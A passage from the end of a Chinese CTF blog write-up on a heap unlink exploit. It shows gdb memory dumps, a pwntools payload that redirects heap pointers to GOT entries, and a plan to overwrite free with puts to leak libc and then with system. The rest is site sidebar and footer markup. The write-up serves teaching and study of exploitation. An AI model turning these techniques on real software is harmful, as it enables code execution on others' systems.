+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x/32gx 0x602300</span><br><span class="line">0x602300 &lt;chunk&gt;:	0x00000000006022e8	0x0000000000000000</span><br><span class="line">0x602310 &lt;chunk+16&gt;:	0x0000000001955150	0x0000000001955260</span><br><span class="line">0x602320 &lt;chunk+32&gt;:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>
+
+<p>所以到这里为止我们所实现的就是将<code>&amp;P-0x18</code>写进了<code>&amp;P</code>里面，完成了堆指针的修改</p>
+<p>然后我们再用edit功能函数编辑chunk0的时候，实际上就是从<code>0x6022e8</code>开始写值，这样我们就能进一步将堆指针修改成任意值，从而完成最后的任意地址写</p>
+<p>接下来就是这题剩下的部分了，我们将堆指针修改成如下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x18</span></span><br><span class="line">payload += p64(elf.got[<span class="string">&#x27;atoi&#x27;</span>])</span><br><span class="line">payload += p64(elf.got[<span class="string">&#x27;atoi&#x27;</span>])</span><br><span class="line">payload += p64(elf.got[<span class="string">&#x27;free&#x27;</span>])</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x30</span>,payload)</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x/32gx 0x602300</span><br><span class="line">0x602300 &lt;chunk&gt;:	0x0000000000602060	0x0000000000602060</span><br><span class="line">0x602310 &lt;chunk+16&gt;:	0x0000000000602018	0x0000000001955260</span><br></pre></td></tr></table></figure>
+
+<p>因为本题的got表可改，而且没有show功能，所以我们将free函数的got表改成puts函数，然后free(0)就能将atoi函数的got表泄漏，完成libc的泄漏，最后free改system就行。</p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/pwn/" rel="tag"># pwn</a>
+              <a href="/tags/%E5%A0%86/" rel="tag"># 堆</a>
+              <a href="/tags/unlink/" rel="tag"># unlink</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2022/05/07/extend-overlopping/" rel="prev" title="extend_overlopping">
+      <i class="fa fa-chevron-left"></i> extend_overlopping
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%80%BB%E7%BB%93"><span class="nav-number">1.</span> <span class="nav-text">总结</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9"><span class="nav-number">2.</span> <span class="nav-text">知识点</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%85%B3%E4%BA%8EFD-gt-bk%E5%92%8CBK-gt-fd"><span class="nav-number">2.1.</span> <span class="nav-text">关于FD-&gt;bk和BK-&gt;fd</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%94%A8%E4%B8%80%E9%81%93%E9%A2%98%E7%9B%AE%E6%9D%A5%E8%AE%B2"><span class="nav-number">2.2.</span> <span class="nav-text">用一道题目来讲</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">John Doe</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">44</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">29</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">John Doe</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
